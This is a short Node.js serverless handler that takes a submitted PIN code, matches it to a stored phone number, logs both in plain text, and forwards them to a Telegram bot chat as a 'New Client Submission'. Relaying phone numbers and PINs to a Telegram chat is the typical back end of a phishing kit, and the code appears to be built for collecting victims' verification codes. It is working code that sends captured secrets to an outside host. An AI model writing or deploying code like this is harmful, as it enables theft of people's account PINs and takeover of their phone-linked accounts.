import fetch from 'node-fetch';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;


// In-memory store for client data (consider a database for production)
const clientData = {};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { pinCode } = req.body;

      // Validate PIN presence
      if (!pinCode) {
        res.status(400).json({ error: 'PIN code is required.' });
        return;
      }

      console.log(`Received PIN: ${pinCode}`);

      // Find the phone number waiting for the PIN
      const phoneNumber = Object.keys(clientData).find(phone => clientData[phone] === null);

      if (!phoneNumber) {
        res.status(400).json({ error: 'No phone number waiting for a PIN.' });
        return;
      }

      // Store the PIN code
      clientData[phoneNumber] = pinCode;
      console.log(`PIN code stored for phone number: ${phoneNumber}`);

      // Send phone number and PIN code to Telegram
      const message = `New Client Submission:\nPhone Number: ${phoneNumber}\nPIN Code: ${pinCode}`;
      await sendTelegramMessage(message);

      // Respond to the client
      res.status(200).json({ status: 'PIN code received and sent to Telegram.' });
    } catch (error) {
      console.error('Error processing the PIN:', error);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  } else {
    // Method not allowed
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Message sent to Telegram successfully');
    } else {
      const errorText = await response.text();
      console.error(`Failed to send message to Telegram: ${response.status} - ${errorText}`);
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}
